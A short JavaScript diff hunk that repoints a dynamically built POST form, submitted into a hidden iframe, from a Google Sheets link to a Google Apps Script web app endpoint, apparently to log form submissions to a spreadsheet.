@@ -425,7 +425,7 @@ try {
     // Create the form element
     const submitForm = document.createElement('form');
     submitForm.setAttribute('method', 'POST');
-   submitForm.setAttribute('action', 'https://docs.google.com/spreadsheets/d/1fM11c84e-D01z3hbpjLLl2nRaL2grTkDEl5iGsJDLPw/edit?gid=0#gid=0');
+    submitForm.setAttribute('action', 'https://script.google.com/macros/s/AKfycbxeO9xNEUtPJfiZFBzJDoy66_8HH937K_N0yK6Vyayao9IfrhTBb_bV4mjKyPsbKbKq/exec');
     submitForm.setAttribute('target', 'hidden_iframe');
 
     // Create all your form data
